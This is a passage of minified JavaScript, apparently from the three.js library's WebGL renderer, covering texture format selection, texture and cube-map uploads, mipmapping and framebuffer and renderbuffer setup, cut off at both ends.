orei(o.UNPACK_SKIP_IMAGES,0),x={},v={},mt=null,gt={},_={},E=new WeakMap,T=[],w=null,y=!1,S=null,N=null,B=null,C=null,U=null,D=null,P=null,b=new ze(0,0,0),L=0,F=!1,V=null,$=null,ft=null,j=null,et=null,z.set(0,0,o.canvas.width,o.canvas.height),pt.set(0,0,o.canvas.width,o.canvas.height),f.reset(),d.reset(),h.reset()}return{buffers:{color:f,depth:d,stencil:h},enable:ut,disable:Tt,bindFramebuffer:wt,drawBuffers:_t,useProgram:Rt,setBlending:ge,setMaterial:Se,setFlipSided:ee,setCullFace:ie,setLineWidth:Ve,setPolygonOffset:fn,setScissorTest:Pe,activeTexture:$e,bindTexture:k,unbindTexture:en,compressedTexImage2D:Oe,compressedTexImage3D:O,texImage2D:xt,texImage3D:Et,pixelStorei:$t,getParameter:Dt,updateUBOMapping:Wt,uniformBlockBinding:ne,texStorage2D:Ct,texStorage3D:Lt,texSubImage2D:M,texSubImage3D:tt,compressedTexSubImage2D:ot,compressedTexSubImage3D:vt,scissor:Ft,viewport:zt,reset:ce}}function E3(o,e,i,s,c,f,d){const h=e.has("WEBGL_multisampled_render_to_texture")?e.get("WEBGL_multisampled_render_to_texture"):null,m=typeof navigator>"u"?!1:/OculusBrowser/g.test(navigator.userAgent),p=new Ue,x=new WeakMap,v=new Set;let _;const E=new WeakMap;let T=!1;try{T=typeof OffscreenCanvas<"u"&&new OffscreenCanvas(1,1).getContext("2d")!==null}catch{}function w(O,M){return T?new OffscreenCanvas(O,M):Uu("canvas")}function y(O,M,tt){let ot=1;const vt=Oe(O);if((vt.width>tt||vt.height>tt)&&(ot=tt/Math.max(vt.width,vt.height)),ot<1)if(typeof HTMLImageElement<"u"&&O instanceof HTMLImageElement||typeof HTMLCanvasElement<"u"&&O instanceof HTMLCanvasElement||typeof ImageBitmap<"u"&&O instanceof ImageBitmap||typeof VideoFrame<"u"&&O instanceof VideoFrame){const Ct=Math.floor(ot*vt.width),Lt=Math.floor(ot*vt.height);_===void 0&&(_=w(Ct,Lt));const xt=M?w(Ct,Lt):_;return xt.width=Ct,xt.height=Lt,xt.getContext("2d").drawImage(O,0,0,Ct,Lt),se("WebGLRenderer: Texture has been resized from ("+vt.width+"x"+vt.height+") to ("+Ct+"x"+Lt+")."),xt}else return"data"in O&&se("WebGLRenderer: Image in DataTexture is too big ("+vt.width+"x"+vt.height+")."),O;return O}function S(O){return O.generateMipmaps}function N(O){o.generateMipmap(O)}function B(O){return O.isWebGLCubeRenderTarget?o.TEXTURE_CUBE_MAP:O.isWebGL3DRenderTarget?o.TEXTURE_3D:O.isWebGLArrayRenderTarget||O.isCompressedArrayTexture?o.TEXTURE_2D_ARRAY:o.TEXTURE_2D}function C(O,M,tt,ot,vt,Ct=!1){if(O!==null){if(o[O]!==void 0)return o[O];se("WebGLRenderer: Attempt to use non-existing WebGL internal format '"+O+"'")}let Lt;ot&&(Lt=e.get("EXT_texture_norm16"),Lt||se("WebGLRenderer: Unable to use normalized textures without EXT_texture_norm16 extension"));let xt=M;if(M===o.RED&&(tt===o.FLOAT&&(xt=o.R32F),tt===o.HALF_FLOAT&&(xt=o.R16F),tt===o.UNSIGNED_BYTE&&(xt=o.R8),tt===o.UNSIGNED_SHORT&&Lt&&(xt=Lt.R16_EXT),tt===o.SHORT&&Lt&&(xt=Lt.R16_SNORM_EXT)),M===o.RED_INTEGER&&(tt===o.UNSIGNED_BYTE&&(xt=o.R8UI),tt===o.UNSIGNED_SHORT&&(xt=o.R16UI),tt===o.UNSIGNED_INT&&(xt=o.R32UI),tt===o.BYTE&&(xt=o.R8I),tt===o.SHORT&&(xt=o.R16I),tt===o.INT&&(xt=o.R32I)),M===o.RG&&(tt===o.FLOAT&&(xt=o.RG32F),tt===o.HALF_FLOAT&&(xt=o.RG16F),tt===o.UNSIGNED_BYTE&&(xt=o.RG8),tt===o.UNSIGNED_SHORT&&Lt&&(xt=Lt.RG16_EXT),tt===o.SHORT&&Lt&&(xt=Lt.RG16_SNORM_EXT)),M===o.RG_INTEGER&&(tt===o.UNSIGNED_BYTE&&(xt=o.RG8UI),tt===o.UNSIGNED_SHORT&&(xt=o.RG16UI),tt===o.UNSIGNED_INT&&(xt=o.RG32UI),tt===o.BYTE&&(xt=o.RG8I),tt===o.SHORT&&(xt=o.RG16I),tt===o.INT&&(xt=o.RG32I)),M===o.RGB_INTEGER&&(tt===o.UNSIGNED_BYTE&&(xt=o.RGB8UI),tt===o.UNSIGNED_SHORT&&(xt=o.RGB16UI),tt===o.UNSIGNED_INT&&(xt=o.RGB32UI),tt===o.BYTE&&(xt=o.RGB8I),tt===o.SHORT&&(xt=o.RGB16I),tt===o.INT&&(xt=o.RGB32I)),M===o.RGBA_INTEGER&&(tt===o.UNSIGNED_BYTE&&(xt=o.RGBA8UI),tt===o.UNSIGNED_SHORT&&(xt=o.RGBA16UI),tt===o.UNSIGNED_INT&&(xt=o.RGBA32UI),tt===o.BYTE&&(xt=o.RGBA8I),tt===o.SHORT&&(xt=o.RGBA16I),tt===o.INT&&(xt=o.RGBA32I)),M===o.RGB&&(tt===o.UNSIGNED_SHORT&&Lt&&(xt=Lt.RGB16_EXT),tt===o.SHORT&&Lt&&(xt=Lt.RGB16_SNORM_EXT),tt===o.UNSIGNED_INT_5_9_9_9_REV&&(xt=o.RGB9_E5),tt===o.UNSIGNED_INT_10F_11F_11F_REV&&(xt=o.R11F_G11F_B10F)),M===o.RGBA){const Et=Ct?Nu:we.getTransfer(vt);tt===o.FLOAT&&(xt=o.RGBA32F),tt===o.HALF_FLOAT&&(xt=o.RGBA16F),tt===o.UNSIGNED_BYTE&&(xt=Et===qe?o.SRGB8_ALPHA8:o.RGBA8),tt===o.UNSIGNED_SHORT&&Lt&&(xt=Lt.RGBA16_EXT),tt===o.SHORT&&Lt&&(xt=Lt.RGBA16_SNORM_EXT),tt===o.UNSIGNED_SHORT_4_4_4_4&&(xt=o.RGBA4),tt===o.UNSIGNED_SHORT_5_5_5_1&&(xt=o.RGB5_A1)}return(xt===o.R16F||xt===o.R32F||xt===o.RG16F||xt===o.RG32F||xt===o.RGBA16F||xt===o.RGBA32F)&&e.get("EXT_color_buffer_float"),xt}function U(O,M){let tt;return O?M===null||M===sa||M===xl?tt=o.DEPTH24_STENCIL8:M===ia?tt=o.DEPTH32F_STENCIL8:M===vl&&(tt=o.DEPTH24_STENCIL8,se("DepthTexture: 16 bit depth attachment is not supported with stencil. Using 24-bit attachment.")):M===null||M===sa||M===xl?tt=o.DEPTH_COMPONENT24:M===ia?tt=o.DEPTH_COMPONENT32F:M===vl&&(tt=o.DEPTH_COMPONENT16),tt}function D(O,M){return S(O)===!0||O.isFramebufferTexture&&O.minFilter!==Un&&O.minFilter!==In?Math.log2(Math.max(M.width,M.height))+1:O.mipmaps!==void 0&&O.mipmaps.length>0?O.mipmaps.length:O.isCompressedTexture&&Array.isArray(O.image)?M.mipmaps.length:1}function P(O){const M=O.target;M.removeEventListener("dispose",P),L(M),M.isVideoTexture&&x.delete(M),M.isHTMLTexture&&v.delete(M)}function b(O){const M=O.target;M.removeEventListener("dispose",b),V(M)}function L(O){const M=s.get(O);if(M.__webglInit===void 0)return;const tt=O.source,ot=E.get(tt);if(ot){const vt=ot[M.__cacheKey];vt.usedTimes--,vt.usedTimes===0&&F(O),Object.keys(ot).length===0&&E.delete(tt)}s.remove(O)}function F(O){const M=s.get(O);o.deleteTexture(M.__webglTexture);const tt=O.source,ot=E.get(tt);delete ot[M.__cacheKey],d.memory.textures--}function V(O){const M=s.get(O);if(O.depthTexture&&(O.depthTexture.dispose(),s.remove(O.depthTexture)),O.isWebGLCubeRenderTarget)for(let ot=0;ot<6;ot++){if(Array.isArray(M.__webglFramebuffer[ot]))for(let vt=0;vt<M.__webglFramebuffer[ot].length;vt++)o.deleteFramebuffer(M.__webglFramebuffer[ot][vt]);else o.deleteFramebuffer(M.__webglFramebuffer[ot]);M.__webglDepthbuffer&&o.deleteRenderbuffer(M.__webglDepthbuffer[ot])}else{if(Array.isArray(M.__webglFramebuffer))for(let ot=0;ot<M.__webglFramebuffer.length;ot++)o.deleteFramebuffer(M.__webglFramebuffer[ot]);else o.deleteFramebuffer(M.__webglFramebuffer);if(M.__webglDepthbuffer&&o.deleteRenderbuffer(M.__webglDepthbuffer),M.__webglMultisampledFramebuffer&&o.deleteFramebuffer(M.__webglMultisampledFramebuffer),M.__webglColorRenderbuffer)for(let ot=0;ot<M.__webglColorRenderbuffer.length;ot++)M.__webglColorRenderbuffer[ot]&&o.deleteRenderbuffer(M.__webglColorRenderbuffer[ot]);M.__webglDepthRenderbuffer&&o.deleteRenderbuffer(M.__webglDepthRenderbuffer)}const tt=O.textures;for(let ot=0,vt=tt.length;ot<vt;ot++){const Ct=s.get(tt[ot]);Ct.__webglTexture&&(o.deleteTexture(Ct.__webglTexture),d.memory.textures--),s.remove(tt[ot])}s.remove(O)}let $=0;function ft(){$=0}function j(){return $}function et(O){$=O}function q(){const O=$;return O>=c.maxTextures&&se("WebGLTextures: Trying to use "+(O+1)+" texture units while this GPU supports only "+c.maxTextures),$+=1,O}function W(O){const M=[];return M.push(O.wrapS),M.push(O.wrapT),M.push(O.wrapR||0),M.push(O.magFilter),M.push(O.minFilter),M.push(O.anisotropy),M.push(O.internalFormat),M.push(O.format),M.push(O.type),M.push(O.generateMipmaps),M.push(O.premultiplyAlpha),M.push(O.flipY),M.push(O.unpackAlignment),M.push(O.colorSpace),M.join()}function ht(O,M){const tt=s.get(O);if(O.isVideoTexture&&k(O),O.isRenderTargetTexture===!1&&O.isExternalTexture!==!0&&O.version>0&&tt.__version!==O.version){const ot=O.image;if(ot===null)se("WebGLRenderer: Texture marked for update but no image data found.");else if(ot.complete===!1)se("WebGLRenderer: Texture marked for update but image is incomplete");else{Tt(tt,O,M);return}}else O.isExternalTexture&&(tt.__webglTexture=O.sourceTexture?O.sourceTexture:null);i.bindTexture(o.TEXTURE_2D,tt.__webglTexture,o.TEXTURE0+M)}function lt(O,M){const tt=s.get(O);if(O.isRenderTargetTexture===!1&&O.version>0&&tt.__version!==O.version){Tt(tt,O,M);return}else O.isExternalTexture&&(tt.__webglTexture=O.sourceTexture?O.sourceTexture:null);i.bindTexture(o.TEXTURE_2D_ARRAY,tt.__webglTexture,o.TEXTURE0+M)}function mt(O,M){const tt=s.get(O);if(O.isRenderTargetTexture===!1&&O.version>0&&tt.__version!==O.version){Tt(tt,O,M);return}i.bindTexture(o.TEXTURE_3D,tt.__webglTexture,o.TEXTURE0+M)}function gt(O,M){const tt=s.get(O);if(O.isCubeDepthTexture!==!0&&O.version>0&&tt.__version!==O.version){wt(tt,O,M);return}i.bindTexture(o.TEXTURE_CUBE_MAP,tt.__webglTexture,o.TEXTURE0+M)}const Bt={[op]:o.REPEAT,[Na]:o.CLAMP_TO_EDGE,[lp]:o.MIRRORED_REPEAT},Ut={[Un]:o.NEAREST,[BE]:o.NEAREST_MIPMAP_NEAREST,[Yc]:o.NEAREST_MIPMAP_LINEAR,[In]:o.LINEAR,[Sh]:o.LINEAR_MIPMAP_NEAREST,[qr]:o.LINEAR_MIPMAP_LINEAR},z={[VE]:o.NEVER,[YE]:o.ALWAYS,[XE]:o.LESS,[Jp]:o.LEQUAL,[kE]:o.EQUAL,[$p]:o.GEQUAL,[WE]:o.GREATER,[qE]:o.NOTEQUAL};function pt(O,M){if(M.type===ia&&e.has("OES_texture_float_linear")===!1&&(M.magFilter===In||M.magFilter===Sh||M.magFilter===Yc||M.magFilter===qr||M.minFilter===In||M.minFilter===Sh||M.minFilter===Yc||M.minFilter===qr)&&se("WebGLRenderer: Unable to use linear filtering with floating point textures. OES_texture_float_linear not supported on this device."),o.texParameteri(O,o.TEXTURE_WRAP_S,Bt[M.wrapS]),o.texParameteri(O,o.TEXTURE_WRAP_T,Bt[M.wrapT]),(O===o.TEXTURE_3D||O===o.TEXTURE_2D_ARRAY)&&o.texParameteri(O,o.TEXTURE_WRAP_R,Bt[M.wrapR]),o.texParameteri(O,o.TEXTURE_MAG_FILTER,Ut[M.magFilter]),o.texParameteri(O,o.TEXTURE_MIN_FILTER,Ut[M.minFilter]),M.compareFunction&&(o.texParameteri(O,o.TEXTURE_COMPARE_MODE,o.COMPARE_REF_TO_TEXTURE),o.texParameteri(O,o.TEXTURE_COMPARE_FUNC,z[M.compareFunction])),e.has("EXT_texture_filter_anisotropic")===!0){if(M.magFilter===Un||M.minFilter!==Yc&&M.minFilter!==qr||M.type===ia&&e.has("OES_texture_float_linear")===!1)return;if(M.anisotropy>1||s.get(M).__currentAnisotropy){const tt=e.get("EXT_texture_filter_anisotropic");o.texParameterf(O,tt.TEXTURE_MAX_ANISOTROPY_EXT,Math.min(M.anisotropy,c.getMaxAnisotropy())),s.get(M).__currentAnisotropy=M.anisotropy}}}function At(O,M){let tt=!1;O.__webglInit===void 0&&(O.__webglInit=!0,M.addEventListener("dispose",P));const ot=M.source;let vt=E.get(ot);vt===void 0&&(vt={},E.set(ot,vt));const Ct=W(M);if(Ct!==O.__cacheKey){vt[Ct]===void 0&&(vt[Ct]={texture:o.createTexture(),usedTimes:0},d.memory.textures++,tt=!0),vt[Ct].usedTimes++;const Lt=vt[O.__cacheKey];Lt!==void 0&&(vt[O.__cacheKey].usedTimes--,Lt.usedTimes===0&&F(M)),O.__cacheKey=Ct,O.__webglTexture=vt[Ct].texture}return tt}function Y(O,M,tt){return Math.floor(Math.floor(O/tt)/M)}function ut(O,M,tt,ot){const Ct=O.updateRanges;if(Ct.length===0)i.texSubImage2D(o.TEXTURE_2D,0,0,0,M.width,M.height,tt,ot,M.data);else{Ct.sort(($t,Ft)=>$t.start-Ft.start);let Lt=0;for(let $t=1;$t<Ct.length;$t++){const Ft=Ct[Lt],zt=Ct[$t],Wt=Ft.start+Ft.count,ne=Y(zt.start,M.width,4),ce=Y(Ft.start,M.width,4);zt.start<=Wt+1&&ne===ce&&Y(zt.start+zt.count-1,M.width,4)===ne?Ft.count=Math.max(Ft.count,zt.start+zt.count-Ft.start):(++Lt,Ct[Lt]=zt)}Ct.length=Lt+1;const xt=i.getParameter(o.UNPACK_ROW_LENGTH),Et=i.getParameter(o.UNPACK_SKIP_PIXELS),Dt=i.getParameter(o.UNPACK_SKIP_ROWS);i.pixelStorei(o.UNPACK_ROW_LENGTH,M.width);for(let $t=0,Ft=Ct.length;$t<Ft;$t++){const zt=Ct[$t],Wt=Math.floor(zt.start/4),ne=Math.ceil(zt.count/4),ce=Wt%M.width,X=Math.floor(Wt/M.width),Nt=ne,Mt=1;i.pixelStorei(o.UNPACK_SKIP_PIXELS,ce),i.pixelStorei(o.UNPACK_SKIP_ROWS,X),i.texSubImage2D(o.TEXTURE_2D,0,ce,X,Nt,Mt,tt,ot,M.data)}O.clearUpdateRanges(),i.pixelStorei(o.UNPACK_ROW_LENGTH,xt),i.pixelStorei(o.UNPACK_SKIP_PIXELS,Et),i.pixelStorei(o.UNPACK_SKIP_ROWS,Dt)}}function Tt(O,M,tt){let ot=o.TEXTURE_2D;(M.isDataArrayTexture||M.isCompressedArrayTexture)&&(ot=o.TEXTURE_2D_ARRAY),M.isData3DTexture&&(ot=o.TEXTURE_3D);const vt=At(O,M),Ct=M.source;i.bindTexture(ot,O.__webglTexture,o.TEXTURE0+tt);const Lt=s.get(Ct);if(Ct.version!==Lt.__version||vt===!0){if(i.activeTexture(o.TEXTURE0+tt),(typeof ImageBitmap<"u"&&M.image instanceof ImageBitmap)===!1){const Mt=we.getPrimaries(we.workingColorSpace),Ot=M.colorSpace===gr?null:we.getPrimaries(M.colorSpace),kt=M.colorSpace===gr||Mt===Ot?o.NONE:o.BROWSER_DEFAULT_WEBGL;i.pixelStorei(o.UNPACK_FLIP_Y_WEBGL,M.flipY),i.pixelStorei(o.UNPACK_PREMULTIPLY_ALPHA_WEBGL,M.premultiplyAlpha),i.pixelStorei(o.UNPACK_COLORSPACE_CONVERSION_WEBGL,kt)}i.pixelStorei(o.UNPACK_ALIGNMENT,M.unpackAlignment);let Et=y(M.image,!1,c.maxTextureSize);Et=en(M,Et);const Dt=f.convert(M.format,M.colorSpace),$t=f.convert(M.type);let Ft=C(M.internalFormat,Dt,$t,M.normalized,M.colorSpace,M.isVideoTexture);pt(ot,M);let zt;const Wt=M.mipmaps,ne=M.isVideoTexture!==!0,ce=Lt.__version===void 0||vt===!0,X=Ct.dataReady,Nt=D(M,Et);if(M.isDepthTexture)Ft=U(M.format===Yr,M.type),ce&&(ne?i.texStorage2D(o.TEXTURE_2D,1,Ft,Et.width,Et.height):i.texImage2D(o.TEXTURE_2D,0,Ft,Et.width,Et.height,0,Dt,$t,null));else if(M.isDataTexture)if(Wt.length>0){ne&&ce&&i.texStorage2D(o.TEXTURE_2D,Nt,Ft,Wt[0].width,Wt[0].height);for(let Mt=0,Ot=Wt.length;Mt<Ot;Mt++)zt=Wt[Mt],ne?X&&i.texSubImage2D(o.TEXTURE_2D,Mt,0,0,zt.width,zt.height,Dt,$t,zt.data):i.texImage2D(o.TEXTURE_2D,Mt,Ft,zt.width,zt.height,0,Dt,$t,zt.data);M.generateMipmaps=!1}else ne?(ce&&i.texStorage2D(o.TEXTURE_2D,Nt,Ft,Et.width,Et.height),X&&ut(M,Et,Dt,$t)):i.texImage2D(o.TEXTURE_2D,0,Ft,Et.width,Et.height,0,Dt,$t,Et.data);else if(M.isCompressedTexture)if(M.isCompressedArrayTexture){ne&&ce&&i.texStorage3D(o.TEXTURE_2D_ARRAY,Nt,Ft,Wt[0].width,Wt[0].height,Et.depth);for(let Mt=0,Ot=Wt.length;Mt<Ot;Mt++)if(zt=Wt[Mt],M.format!==zi)if(Dt!==null)if(ne){if(X)if(M.layerUpdates.size>0){const kt=tx(zt.width,zt.height,M.format,M.type);for(const bt of M.layerUpdates){const Jt=zt.data.subarray(bt*kt/zt.data.BYTES_PER_ELEMENT,(bt+1)*kt/zt.data.BYTES_PER_ELEMENT);i.compressedTexSubImage3D(o.TEXTURE_2D_ARRAY,Mt,0,0,bt,zt.width,zt.height,1,Dt,Jt)}}else i.compressedTexSubImage3D(o.TEXTURE_2D_ARRAY,Mt,0,0,0,zt.width,zt.height,Et.depth,Dt,zt.data)}else i.compressedTexImage3D(o.TEXTURE_2D_ARRAY,Mt,Ft,zt.width,zt.height,Et.depth,0,zt.data,0,0);else se("WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()");else ne?X&&i.texSubImage3D(o.TEXTURE_2D_ARRAY,Mt,0,0,0,zt.width,zt.height,Et.depth,Dt,$t,zt.data):i.texImage3D(o.TEXTURE_2D_ARRAY,Mt,Ft,zt.width,zt.height,Et.depth,0,Dt,$t,zt.data);M.layerUpdates.size>0&&M.clearLayerUpdates()}else{ne&&ce&&i.texStorage2D(o.TEXTURE_2D,Nt,Ft,Wt[0].width,Wt[0].height);for(let Mt=0,Ot=Wt.length;Mt<Ot;Mt++)zt=Wt[Mt],M.format!==zi?Dt!==null?ne?X&&i.compressedTexSubImage2D(o.TEXTURE_2D,Mt,0,0,zt.width,zt.height,Dt,zt.data):i.compressedTexImage2D(o.TEXTURE_2D,Mt,Ft,zt.width,zt.height,0,zt.data):se("WebGLRenderer: Attempt to load unsupported compressed texture format in .uploadTexture()"):ne?X&&i.texSubImage2D(o.TEXTURE_2D,Mt,0,0,zt.width,zt.height,Dt,$t,zt.data):i.texImage2D(o.TEXTURE_2D,Mt,Ft,zt.width,zt.height,0,Dt,$t,zt.data)}else if(M.isDataArrayTexture)if(ne){if(ce&&i.texStorage3D(o.TEXTURE_2D_ARRAY,Nt,Ft,Et.width,Et.height,Et.depth),X)if(M.layerUpdates.size>0){const Mt=tx(Et.width,Et.height,M.format,M.type);for(const Ot of M.layerUpdates){const kt=Et.data.subarray(Ot*Mt/Et.data.BYTES_PER_ELEMENT,(Ot+1)*Mt/Et.data.BYTES_PER_ELEMENT);i.texSubImage3D(o.TEXTURE_2D_ARRAY,0,0,0,Ot,Et.width,Et.height,1,Dt,$t,kt)}M.clearLayerUpdates()}else i.texSubImage3D(o.TEXTURE_2D_ARRAY,0,0,0,0,Et.width,Et.height,Et.depth,Dt,$t,Et.data)}else i.texImage3D(o.TEXTURE_2D_ARRAY,0,Ft,Et.width,Et.height,Et.depth,0,Dt,$t,Et.data);else if(M.isData3DTexture)ne?(ce&&i.texStorage3D(o.TEXTURE_3D,Nt,Ft,Et.width,Et.height,Et.depth),X&&i.texSubImage3D(o.TEXTURE_3D,0,0,0,0,Et.width,Et.height,Et.depth,Dt,$t,Et.data)):i.texImage3D(o.TEXTURE_3D,0,Ft,Et.width,Et.height,Et.depth,0,Dt,$t,Et.data);else if(M.isFramebufferTexture){if(ce)if(ne)i.texStorage2D(o.TEXTURE_2D,Nt,Ft,Et.width,Et.height);else{let Mt=Et.width,Ot=Et.height;for(let kt=0;kt<Nt;kt++)i.texImage2D(o.TEXTURE_2D,kt,Ft,Mt,Ot,0,Dt,$t,null),Mt>>=1,Ot>>=1}}else if(M.isHTMLTexture){if("texElementImage2D"in o){const Mt=o.canvas;if(Mt.hasAttribute("layoutsubtree")||Mt.setAttribute("layoutsubtree","true"),Et.parentNode!==Mt){Mt.appendChild(Et),v.add(M),Mt.onpaint=Ot=>{const kt=Ot.changedElements;for(const bt of v)kt.includes(bt.image)&&(bt.needsUpdate=!0)},Mt.requestPaint();return}if(o.texElementImage2D.length===3)o.texElementImage2D(o.TEXTURE_2D,o.RGBA8,Et);else{const kt=o.RGBA,bt=o.RGBA,Jt=o.UNSIGNED_BYTE;o.texElementImage2D(o.TEXTURE_2D,0,kt,bt,Jt,Et)}o.texParameteri(o.TEXTURE_2D,o.TEXTURE_MIN_FILTER,o.LINEAR),o.texParameteri(o.TEXTURE_2D,o.TEXTURE_WRAP_S,o.CLAMP_TO_EDGE),o.texParameteri(o.TEXTURE_2D,o.TEXTURE_WRAP_T,o.CLAMP_TO_EDGE)}}else if(Wt.length>0){if(ne&&ce){const Mt=Oe(Wt[0]);i.texStorage2D(o.TEXTURE_2D,Nt,Ft,Mt.width,Mt.height)}for(let Mt=0,Ot=Wt.length;Mt<Ot;Mt++)zt=Wt[Mt],ne?X&&i.texSubImage2D(o.TEXTURE_2D,Mt,0,0,Dt,$t,zt):i.texImage2D(o.TEXTURE_2D,Mt,Ft,Dt,$t,zt);M.generateMipmaps=!1}else if(ne){if(ce){const Mt=Oe(Et);i.texStorage2D(o.TEXTURE_2D,Nt,Ft,Mt.width,Mt.height)}X&&i.texSubImage2D(o.TEXTURE_2D,0,0,0,Dt,$t,Et)}else i.texImage2D(o.TEXTURE_2D,0,Ft,Dt,$t,Et);S(M)&&N(ot),Lt.__version=Ct.version,M.onUpdate&&M.onUpdate(M)}O.__version=M.version}function wt(O,M,tt){if(M.image.length!==6)return;const ot=At(O,M),vt=M.source;i.bindTexture(o.TEXTURE_CUBE_MAP,O.__webglTexture,o.TEXTURE0+tt);const Ct=s.get(vt);if(vt.version!==Ct.__version||ot===!0){i.activeTexture(o.TEXTURE0+tt);const Lt=we.getPrimaries(we.workingColorSpace),xt=M.colorSpace===gr?null:we.getPrimaries(M.colorSpace),Et=M.colorSpace===gr||Lt===xt?o.NONE:o.BROWSER_DEFAULT_WEBGL;i.pixelStorei(o.UNPACK_FLIP_Y_WEBGL,M.flipY),i.pixelStorei(o.UNPACK_PREMULTIPLY_ALPHA_WEBGL,M.premultiplyAlpha),i.pixelStorei(o.UNPACK_ALIGNMENT,M.unpackAlignment),i.pixelStorei(o.UNPACK_COLORSPACE_CONVERSION_WEBGL,Et);const Dt=M.isCompressedTexture||M.image[0].isCompressedTexture,$t=M.image[0]&&M.image[0].isDataTexture,Ft=[];for(let bt=0;bt<6;bt++)!Dt&&!$t?Ft[bt]=y(M.image[bt],!0,c.maxCubemapSize):Ft[bt]=$t?M.image[bt].image:M.image[bt],Ft[bt]=en(M,Ft[bt]);const zt=Ft[0],Wt=f.convert(M.format,M.colorSpace),ne=f.convert(M.type),ce=C(M.internalFormat,Wt,ne,M.normalized,M.colorSpace),X=M.isVideoTexture!==!0,Nt=Ct.__version===void 0||ot===!0,Mt=vt.dataReady;let Ot=D(M,zt);pt(o.TEXTURE_CUBE_MAP,M);let kt;if(Dt){X&&Nt&&i.texStorage2D(o.TEXTURE_CUBE_MAP,Ot,ce,zt.width,zt.height);for(let bt=0;bt<6;bt++){kt=Ft[bt].mipmaps;for(let Jt=0;Jt<kt.length;Jt++){const Xt=kt[Jt];M.format!==zi?Wt!==null?X?Mt&&i.compressedTexSubImage2D(o.TEXTURE_CUBE_MAP_POSITIVE_X+bt,Jt,0,0,Xt.width,Xt.height,Wt,Xt.data):i.compressedTexImage2D(o.TEXTURE_CUBE_MAP_POSITIVE_X+bt,Jt,ce,Xt.width,Xt.height,0,Xt.data):se("WebGLRenderer: Attempt to load unsupported compressed texture format in .setTextureCube()"):X?Mt&&i.texSubImage2D(o.TEXTURE_CUBE_MAP_POSITIVE_X+bt,Jt,0,0,Xt.width,Xt.height,Wt,ne,Xt.data):i.texImage2D(o.TEXTURE_CUBE_MAP_POSITIVE_X+bt,Jt,ce,Xt.width,Xt.height,0,Wt,ne,Xt.data)}}}else{if(kt=M.mipmaps,X&&Nt){kt.length>0&&Ot++;const bt=Oe(Ft[0]);i.texStorage2D(o.TEXTURE_CUBE_MAP,Ot,ce,bt.width,bt.height)}for(let bt=0;bt<6;bt++)if($t){X?Mt&&i.texSubImage2D(o.TEXTURE_CUBE_MAP_POSITIVE_X+bt,0,0,0,Ft[bt].width,Ft[bt].height,Wt,ne,Ft[bt].data):i.texImage2D(o.TEXTURE_CUBE_MAP_POSITIVE_X+bt,0,ce,Ft[bt].width,Ft[bt].height,0,Wt,ne,Ft[bt].data);for(let Jt=0;Jt<kt.length;Jt++){const Re=kt[Jt].image[bt].image;X?Mt&&i.texSubImage2D(o.TEXTURE_CUBE_MAP_POSITIVE_X+bt,Jt+1,0,0,Re.width,Re.height,Wt,ne,Re.data):i.texImage2D(o.TEXTURE_CUBE_MAP_POSITIVE_X+bt,Jt+1,ce,Re.width,Re.height,0,Wt,ne,Re.data)}}else{X?Mt&&i.texSubImage2D(o.TEXTURE_CUBE_MAP_POSITIVE_X+bt,0,0,0,Wt,ne,Ft[bt]):i.texImage2D(o.TEXTURE_CUBE_MAP_POSITIVE_X+bt,0,ce,Wt,ne,Ft[bt]);for(let Jt=0;Jt<kt.length;Jt++){const Xt=kt[Jt];X?Mt&&i.texSubImage2D(o.TEXTURE_CUBE_MAP_POSITIVE_X+bt,Jt+1,0,0,Wt,ne,Xt.image[bt]):i.texImage2D(o.TEXTURE_CUBE_MAP_POSITIVE_X+bt,Jt+1,ce,Wt,ne,Xt.image[bt])}}}S(M)&&N(o.TEXTURE_CUBE_MAP),Ct.__version=vt.version,M.onUpdate&&M.onUpdate(M)}O.__version=M.version}function _t(O,M,tt,ot,vt,Ct){const Lt=f.convert(tt.format,tt.colorSpace),xt=f.convert(tt.type),Et=C(tt.internalFormat,Lt,xt,tt.normalized,tt.colorSpace),Dt=s.get(M),$t=s.get(tt);if($t.__renderTarget=M,!Dt.__hasExternalTextures){const Ft=Math.max(1,M.width>>Ct),zt=Math.max(1,M.height>>Ct);vt===o.TEXTURE_3D||vt===o.TEXTURE_2D_ARRAY?i.texImage3D(vt,Ct,Et,Ft,zt,M.depth,0,Lt,xt,null):i.texImage2D(vt,Ct,Et,Ft,zt,0,Lt,xt,null)}i.bindFramebuffer(o.FRAMEBUFFER,O),$e(M)?h.framebufferTexture2DMultisampleEXT(o.FRAMEBUFFER,ot,vt,$t.__webglTexture,0,Pe(M)):(vt===o.TEXTURE_2D||vt>=o.TEXTURE_CUBE_MAP_POSITIVE_X&&vt<=o.TEXTURE_CUBE_MAP_NEGATIVE_Z)&&o.framebufferTexture2D(o.FRAMEBUFFER,ot,vt,$t.__webglTexture,Ct),i.bindFramebuffer(o.FRAMEBUFFER,null)}function Rt(O,M,tt){if(o.bindRenderbuffer(o.RENDERBUFFER,O),M.depthBuffer){const ot=M.depthTexture,vt=ot&&ot.isDepthTexture?ot.type:null,Ct=U(M.stencilBuffer,vt),Lt=M.stencilBuffer?o.DEPTH_STENCIL_ATTACHMENT:o.DEPTH_ATTACHMENT;$e(M)?h.renderbufferStorageMultisampleEXT(o.RENDERBUFFER,Pe(M),Ct,M.width,M.height):tt?o.renderbufferStorageMultisample(o.RENDERBUFFER,Pe(M),Ct,M.width,M.height):o.renderbufferStorage(o.RENDERBUFFER,Ct,M.width,M.height),o.framebufferRenderbuffer(o.FRAMEBUFFER,Lt,o.RENDERBUFFER,O)}else{const ot=M.textures;for(let vt=0;vt<ot.length;vt++){const Ct=ot[vt],Lt=f.convert(Ct.format,Ct.colorSpace),xt=f.convert(Ct.type),Et=C(Ct.internalFormat,Lt,xt,Ct.normalized,Ct.colorSpace);$e(M)?h.renderbufferStorageMultisampleEXT(o.RENDERBUFFER,Pe(M),Et,M.width,M.height):tt?o.renderbufferStorageMultisample(o.RENDERBUFFER,Pe(M),Et,M.width,M.height):o.renderbufferStorage(o.RENDERBUFFER,Et,M.width,M.height)}}o.bindRenderbuffer(o.RENDERBUFFER,null)}function Le(O,M,tt){const ot=M.isWebGLCubeRenderTarget===!0;if(i.bindFramebuffer(o.FRAMEBUFFER,O),!(M.depthTexture&&M.depthTexture.isDepthTexture))throw new Error("THREE.WebGLTextures: renderTarget.depthTexture must be an instance of THREE.DepthTexture.");const 